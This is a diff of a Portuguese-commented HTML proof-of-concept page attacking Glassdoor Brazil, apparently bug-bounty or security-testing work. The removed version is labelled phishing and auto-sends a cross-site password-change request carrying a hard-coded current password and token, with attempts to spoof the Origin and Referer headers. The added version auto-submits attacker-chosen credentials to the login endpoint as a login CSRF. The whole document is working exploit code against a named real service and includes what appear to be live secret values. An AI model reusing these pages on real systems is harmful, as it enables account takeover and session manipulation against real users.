@@ -1,30 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alteração de Senha - Phishing</title>
-</head>
+<!doctype html>
+<meta charset="utf-8">
+<title>PoC Login CSRF (urlencoded)</title>
 <body>
-    <h1>Alteração de Senha Realizada com Sucesso</h1>
-    <p>Aguarde enquanto processamos sua solicitação...</p>
-    <script>
-        // A requisição maliciosa é disparada automaticamente quando a página é carregada
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://www.glassdoor.com.br/member/account/settings_changePassword.htm", true);  // URL do endpoint da alteração de senha
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-        xhr.setRequestHeader("Origin", "https://www.maliciososite.com");  // Manipulando o cabeçalho Origin
-        xhr.setRequestHeader("Referer", "https://www.maliciososite.com");  // Manipulando o Referer
-        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");  // Cabeçalho comum para requisições AJAX
+<script>
+  // Lê as credenciais do fragmento da URL: #u=<email>&p=<senha>
+  const params = new URLSearchParams(location.hash.slice(1));
+  const u = params.get('u') || '';
+  const p = params.get('p') || '';
+  // Monta um <form> application/x-www-form-urlencoded
+  const f = document.createElement('form');
+  f.action = 'https://www.glassdoor.com.br/auth/login/username-password';
+  f.method = 'POST';
 
-        // Definindo os dados da requisição para alteração de senha
-        var data = "currentPassword=CpD*12341990241436584&newPassword=passwordaltered&newPasswordConfirmation=passwordaltered&gdToken=VNTxonYmGiaAn3mThwwgcg%3AGdIH7klM0EnwKuAOuBliFgzjP2CXUjHknvgpZDq7-oFsJBU0LOvlKJt47EFBk5wyLmf5yF6GIqnGVpSyVgBYCQ%3AwRy2JnnIyKOW5yZ0148oD9IO9Tst5ZAxBSk1KGlb7Dc";  // Dados da requisição maliciosa
+  const iU = document.createElement('input'); iU.name = 'username'; iU.value = u;
+  const iP = document.createElement('input'); iP.name = 'password'; iP.value = p;
+  const iR = document.createElement('input'); iR.name = 'postLoginUrl'; iR.value = '';
 
-        // Enviar a requisição para a alteração de senha
-        xhr.send(data);
+  f.appendChild(iU); f.appendChild(iP); f.appendChild(iR);
+  document.body.appendChild(f);
 
-        // Log para monitorar o envio
-        console.log("Alteração de senha enviada em segundo plano!");
-    </script>
+  // Submete automaticamente
+  if (u && p) {
+    f.submit();
+  } else {
+    document.write('<p>Adicione <code>#u=&lt;email&gt;&amp;p=&lt;senha&gt;</code> à URL e recarregue.</p>');
+  }
+</script>
 </body>
-</html>
